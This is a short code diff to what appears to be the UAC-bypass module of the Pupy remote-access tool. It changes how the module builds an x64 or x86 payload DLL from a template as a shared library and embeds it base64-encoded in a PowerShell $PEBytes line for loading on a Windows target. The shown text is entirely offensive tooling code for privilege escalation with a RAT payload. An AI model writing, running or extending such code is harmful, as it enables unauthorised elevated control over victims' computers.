@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 #Author: @bobsecq
 #Contributor(s):
 
@@ -125,13 +125,11 @@ class bypassuac():
 
         conf = self.module.client.get_conf()
         if "64" in self.module.client.desc["os_arch"] and not force_x86_dll:
-            logging.debug("Target achitecture is x64, using a x64 dll")
-            dllbuff, _, _ = pupygen.generate_binary_from_template(conf, 'windows', arch='x64')
+            dllbuff, tpl, _ = pupygen.generate_binary_from_template(conf, 'windows', arch='x64', shared=True)
         else:
-            logging.debug("Target achitecture is x86, using a x86 dll")
-            dllbuff, _, _ = pupygen.generate_binary_from_template(conf, 'windows', arch='x86')
+            dllbuff, tpl, _ = pupygen.generate_binary_from_template(conf, 'windows', arch='x86', shared=True)
 
-        logging.debug("Creating the pupy dll in %s locally"%(self.pupyDLLLocalPath))
+        logging.debug("Creating the pupy dll (%s) in %s locally"%(tpl, self.pupyDLLLocalPath))
         with open(self.pupyDLLLocalPath, 'w+') as w:
             w.write('$PEBytes = [System.Convert]::FromBase64String("%s")'%(base64.b64encode(dllbuff)))
 
